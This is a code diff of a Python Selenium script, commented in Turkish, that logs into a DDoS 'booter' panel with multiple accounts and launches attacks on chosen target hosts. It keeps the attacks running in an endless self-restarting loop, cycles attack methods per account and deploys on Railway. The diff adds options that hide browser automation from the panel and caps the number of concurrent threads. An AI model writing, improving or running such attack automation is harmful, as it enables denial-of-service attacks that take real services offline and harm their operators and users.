@@ -27,8 +27,11 @@ METHODS = [
 PORT = 80
 DURATION = 60  # saniye
 
+# Aynı anda kaç thread çalışsın (Railway ücretsizde 2 ideal)
+MAX_CONCURRENT_THREADS = 2
+
 # ------------------------------
-# TARAYICI KURULUMU (Railway uyumlu)
+# TARAYICI KURULUMU (Railway uyumlu + kararlı)
 # ------------------------------
 def create_driver():
     chrome_options = Options()
@@ -36,22 +39,35 @@ def create_driver():
     chrome_options.add_argument("--no-sandbox")
     chrome_options.add_argument("--disable-dev-shm-usage")
     chrome_options.add_argument("--disable-gpu")
+    chrome_options.add_argument("--disable-software-rasterizer")
+    chrome_options.add_argument("--disable-setuid-sandbox")
+    chrome_options.add_argument("--single-process")  # bellek tasarrufu
+    chrome_options.add_argument("--memory-pressure-off")
     chrome_options.add_argument("--window-size=1920,1080")
-    chrome_options.add_argument("--remote-debugging-port=9222")  # stabilite için
+    chrome_options.add_argument("--remote-debugging-port=9222")
+    chrome_options.add_argument("--ignore-certificate-errors")
+    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
+    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
+    chrome_options.add_experimental_option('useAutomationExtension', False)
 
-    # Railway'de Chromium varsayılan olarak /usr/bin/chromium ve /usr/bin/chromedriver
+    # Railway'de Chromium yolu
     chromedriver_path = os.getenv("CHROMEDRIVER_BIN", "/usr/bin/chromedriver")
-    
+    chrome_binary = os.getenv("CHROME_BIN", "/usr/bin/chromium")
+
+    if os.path.exists(chrome_binary):
+        chrome_options.binary_location = chrome_binary
+
     if os.path.exists(chromedriver_path):
         service = Service(executable_path=chromedriver_path)
         driver = webdriver.Chrome(service=service, options=chrome_options)
     else:
-        # Yine de webdriver-manager ile denesin (yerel test için)
+        # Yedek: webdriver-manager (yerel test için)
         from webdriver_manager.chrome import ChromeDriverManager
         service = Service(ChromeDriverManager().install())
         driver = webdriver.Chrome(service=service, options=chrome_options)
-    
+
     driver.set_page_load_timeout(60)
+    driver.implicitly_wait(10)
     return driver
 
 # ------------------------------
@@ -66,19 +82,16 @@ def click_okay_modal(driver):
         WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
         time.sleep(2)
     except TimeoutException:
-        pass  # Modal açılmamış olabilir
+        pass
 
 # ------------------------------
 # HER HESAP İÇİN ANA SALDIRI DÖNGÜSÜ (KENDİNİ ONARIR)
 # ------------------------------
 def attack_loop(username, password, target_host, method):
-    while True:  # Dış döngü: hata alınırsa tüm işlemi sıfırlar
+    while True:
         driver = None
         try:
             driver = create_driver()
-            driver.implicitly_wait(10)
-
-            # 1. Giriş Yap
             print(f"[{username}] Giriş yapılıyor...")
             driver.get(LOGIN_URL)
             WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.NAME, "kullaniciadi")))
@@ -88,17 +101,14 @@ def attack_loop(username, password, target_host, method):
             WebDriverWait(driver, 30).until(EC.url_contains("/panel/"))
             print(f"[{username}] Giriş başarılı.")
 
-            # 2. Booter Sayfasına Git
             driver.get(BOOTER_URL)
             WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "host")))
 
-            # 3. Saldırı Parametrelerini Doldur
+            # Parametreleri doldur
             driver.find_element(By.ID, "host").clear()
             driver.find_element(By.ID, "host").send_keys(target_host)
-
             driver.find_element(By.ID, "port").clear()
             driver.find_element(By.ID, "port").send_keys(str(PORT))
-
             driver.find_element(By.ID, "time").clear()
             driver.find_element(By.ID, "time").send_keys(str(DURATION))
 
@@ -108,16 +118,15 @@ def attack_loop(username, password, target_host, method):
                     option.click()
                     break
 
-            # 4. İlk Saldırıyı Başlat
+            # İlk saldırıyı başlat
             print(f"[{username}] {target_host} hedefine {method} ile saldırı başlatılıyor...")
             start_btn = driver.find_element(By.ID, "attack31")
             start_btn.click()
             click_okay_modal(driver)
             print(f"[{username}] İlk saldırı başlatıldı.")
 
-            # 5. SONSUZ YENİLEME DÖNGÜSÜ
+            # Sonsuz yenileme döngüsü
             while True:
-                # Hedef satırını bul (Host sütununa göre)
                 row_xpath = f"//td[contains(text(),'{target_host}')]/parent::tr"
                 try:
                     row = WebDriverWait(driver, 30).until(
@@ -129,18 +138,14 @@ def attack_loop(username, password, target_host, method):
                     time.sleep(5)
                     continue
 
-                # Durum sütunu (5. sütun, index 4)
                 status_cell = row.find_elements(By.TAG_NAME, "td")[4]
                 status_text = status_cell.text.strip()
                 print(f"[{username}] Mevcut durum: {status_text}")
 
-                # Eğer durum sayı ise (sayaç) bitmesini bekle
                 if status_text.isdigit():
-                    remaining = int(status_text)
-                    print(f"[{username}] Saldırı devam ediyor ({remaining}s kaldı)...")
+                    print(f"[{username}] Saldırı devam ediyor ({status_text}s kaldı)...")
                     while True:
                         time.sleep(2)
-                        # Satırı yeniden al (stale hatasını önlemek için)
                         row = driver.find_element(By.XPATH, row_xpath)
                         status_cell = row.find_elements(By.TAG_NAME, "td")[4]
                         new_status = status_cell.text.strip()
@@ -149,9 +154,6 @@ def attack_loop(username, password, target_host, method):
                             break
                         if new_status.isdigit():
                             print(f"[{username}] {new_status}s")
-                else:
-                    # Durum zaten "Expired" veya başka bir şey
-                    pass
 
                 # Yenile butonuna tıkla
                 try:
@@ -176,21 +178,18 @@ def attack_loop(username, password, target_host, method):
                     pass
             print(f"[{username}] 15 saniye beklenip yeniden başlatılacak...")
             time.sleep(15)
-            continue  # Dış döngü yeniden başlar
+            continue
 
 # ------------------------------
-# HESAPLARI OKU (Dosya veya ENV)
+# HESAPLARI OKU VE THREAD'LARI BAŞLAT (SINIRLI SAYIDA)
 # ------------------------------
 def main():
     lines = []
-    
-    # Önce accounts.txt dene
     try:
         with open("accounts.txt", "r") as f:
             lines = [line.strip() for line in f if line.strip()]
         print("accounts.txt dosyası okundu.")
     except FileNotFoundError:
-        # Yoksa ACCOUNTS env değişkenini dene
         env_accounts = os.getenv("ACCOUNTS")
         if env_accounts:
             lines = [line.strip() for line in env_accounts.splitlines() if line.strip()]
@@ -212,17 +211,22 @@ def main():
         print("[!] Geçerli hesap bulunamadı.")
         return
 
-    # Her hesaba sırayla bir method ata
+    # Thread havuzu – sadece MAX_CONCURRENT_THREADS kadar aktif thread
+    semaphore = threading.Semaphore(MAX_CONCURRENT_THREADS)
+
+    def thread_wrapper(user, passw, link, method):
+        with semaphore:
+            attack_loop(user, passw, link, method)
+
     threads = []
     for idx, (user, passw, link) in enumerate(accounts):
         method = METHODS[idx % len(METHODS)]
         print(f"Thread başlatılıyor: {user} -> Hedef: {link}, Method: {method}")
-        t = threading.Thread(target=attack_loop, args=(user, passw, link, method), daemon=True)
+        t = threading.Thread(target=thread_wrapper, args=(user, passw, link, method), daemon=True)
         t.start()
         threads.append(t)
-        time.sleep(5)  # Railway'in aşırı yüklenmemesi için bekle
+        time.sleep(10)  # Her thread arasında 10 saniye bekle (kaynak kullanımını azaltır)
 
-    # Ana thread'i canlı tut
     for t in threads:
         t.join()
 
